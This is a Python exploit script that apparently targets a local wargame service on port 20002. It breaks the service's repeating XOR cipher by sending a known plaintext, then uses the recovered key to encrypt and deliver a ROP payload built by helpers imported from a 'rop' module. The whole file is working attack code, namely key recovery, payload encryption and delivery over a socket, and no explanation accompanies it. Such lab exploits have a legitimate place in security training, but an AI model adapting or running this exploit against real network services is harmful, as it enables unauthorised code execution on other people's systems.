#!/usr/bin/python
import socket
import struct
from time import sleep
from rop import *

HOST = '127.0.0.1'
PORT = 20002

def pack_hex(hex_byte_list):
    key = ''
    length = len(hex_byte_list)
    fmt = '>' + str(length) + 'B'
    key = struct.pack(fmt, *hex_byte_list)
    return key

def break_key(challenge, ctxt):
    '''
    The length of the used key is of 4*32=128 bytes.
    The xor cipher can be broken as follows:
    A xor K = C.
    A xor K xor A = K
    '''
    key = [ ord(ch) ^ ord(ct) for ch, ct in zip(challenge, ctxt)]
    key = pack_hex(key)
    return key

def encrypt_payload(payload, key):
    cp = []
    len_key = len(key)
    j = 0
    for p in payload:
        cp.append(ord(key[j % len_key]) ^ ord(p))
        j += 1
    cp = pack_hex(cp)
    return cp

def exploit(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    sleep(0.5)
    d = s.recv(57)

    challenge = 'A' * 256
    ctxt = communication(challenge, len(challenge), s)
    if ctxt:
        print('[+] Data received.')
        key = break_key(challenge, ctxt)
        if key:
            assert break_key(ctxt, key) == challenge
            print('[+] Key found.')
            print('[+] Encrypting payload.')
            epayload = encrypt_payload(payload, key)
            communication(epayload, len(epayload), s)
        else:
            print('[-] Key not found.')

    print('[+] Sending \'Q\'. Exiting...')
    s.send('Q')
    final_stage(s, strat)
    s.close()

def communication(text, size, s):
    recv_msg = ''
    ssize = struct.pack('<L', size)
    s.send('E')
    print("[+] Sending size: {0}".format(size))
    s.send(ssize)
    print("[+] Sending payload... ")
    s.send(text)
    sleep(0.5) # mandatory to succesfully read the following data
    d = s.recv(120)
    d = s.recv(4)
    size = struct.unpack('<L', d)[0]
    print('[+] Received size: {0}'.format(size))
    recv_msg = ''
    while size > 0:
        ctxt = s.recv(1024)
        recv_msg += ctxt
        size -= len(ctxt)
    print('[+] # bytes read from socket data: {0}'.format(len(recv_msg)))
    return recv_msg

def build_payload(strategy):
    if strategy == 'medium':
        print('[+] Executing medium strategy')
        payload = medium_strategy()
        if payload:
            print('[+] Payload generated with medium strategy')
        else:
            print('[-] Incorrect payload generation with medium strategy')
    else:
        print('[+] Executing default strategy')
        payload = easy_strategy()
        if payload:
            print('[+] Payload generated with default strategy')
        else:
            print('[-] Incorrect payload generation with default strategy')
    return payload

strat = 'medium'
payload = build_payload(strategy=strat)
exploit(payload)


